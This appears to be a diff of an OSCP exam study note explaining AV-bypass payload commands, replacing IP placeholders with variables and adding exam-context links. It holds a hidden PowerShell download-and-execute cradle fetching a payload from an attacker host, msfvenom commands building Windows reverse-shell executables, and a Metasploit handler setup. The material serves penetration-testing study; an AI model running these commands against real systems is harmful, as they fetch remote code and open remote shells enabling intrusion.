@@ -8,7 +8,7 @@ Part of [[COMMAND BREAKDOWNS]]. Explains the mechanics behind AV-bypass payloads
 
 **Full command:**
 ```powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/payload.ps1')"
 ```
 
 **Piece by piece:**
@@ -35,10 +35,10 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebCli
 **Full commands:**
 ```bash
 # Staged -- requires msfconsole multi/handler (nc will catch the connection then immediately drop it)
-msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o staged.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=$BoxIP LPORT=$Port -f exe -o staged.exe
 
 # Stageless -- works with plain nc
-msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o stageless.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$BoxIP LPORT=$Port -f exe -o stageless.exe
 ```
 
 **Piece by piece:**
@@ -52,8 +52,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o stageles
 ```bash
 use multi/handler
 set PAYLOAD windows/shell/reverse_tcp     # slash = staged shell
-set LHOST <kali_ip>
-set LPORT <port>
+set LHOST $LocalIP
+set LPORT $Port
 run
 ```
 
@@ -105,3 +105,14 @@ rm -rf ~/.wine && WINEARCH=win32 wineboot
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
